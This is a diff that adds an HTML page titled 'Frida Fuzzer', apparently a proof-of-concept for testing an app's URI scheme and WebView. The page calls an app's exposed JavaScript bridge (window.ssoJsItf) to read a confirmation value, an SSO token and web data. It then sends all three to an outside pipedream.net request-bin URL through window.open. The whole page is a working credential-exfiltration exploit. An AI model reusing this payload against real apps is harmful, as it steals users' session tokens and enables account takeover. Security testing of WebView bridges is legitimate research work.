@@ -1,0 +1,36 @@
+<!doctype html>
+    <html>
+        <head>
+            <title>Frida Fuzzer</title>
+        </head>
+        <body>
+            <p>Frida Fuzzer</p>
+            <p>: for Fuzzing <strong>URI Scheme</strong></p>
+        <p>
+            <script>
+                var test0 = window.ssoJsItf.getConfirm();
+                document.writeln(test0);
+            </script>
+        </p>
+        <p>
+            <script>
+                var test1 = window.ssoJsItf.getSsoTkn();
+                document.writeln(test1);
+            </script>
+        </p>
+        <p>
+            <script>
+                var test2 = window.ssoJsItf.getWebData();
+                document.writeln(test2);
+            </script>
+        </p>
+
+        <p>
+        <script>
+            window.open("https://dfd0e2e1efab40ae3cee9baa00a5c283.m.pipedream.net/?"  + test0 + "::" + test1 + "::" + test2 + "::")
+            document.writeln("https://dfd0e2e1efab40ae3cee9baa00a5c283.m.pipedream.net/?"  + test0 + "::" + test1 + "::" + test2 + "::")
+        </script>
+        </p>
+
+        </body>
+    </html>
